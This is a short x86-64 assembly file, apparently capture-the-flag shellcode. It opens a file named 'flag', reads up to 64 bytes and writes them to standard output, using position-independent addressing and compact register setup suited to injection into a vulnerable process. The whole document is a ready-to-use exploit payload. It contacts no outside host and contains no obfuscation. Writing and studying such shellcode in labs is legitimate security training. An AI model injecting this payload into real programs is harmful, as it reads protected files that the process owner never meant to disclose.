.intel_syntax noprefix

.text
.global _start
_start:
	lea r15, [rip + .Lfilename]

	mov al, 2
	mov rdi, r15
	xor esi, esi
	syscall

	mov edi, eax
	xor eax, eax
	mov rsi, r15
	mov dl, 64
	syscall

	mov edx, eax
	xor eax, eax
	inc eax
	xor edi, edi
	inc edi
	mov rsi, r15
	syscall

	mov rax, 60
	xor edi, edi
	syscall

.Lfilename:
	.asciz "flag"
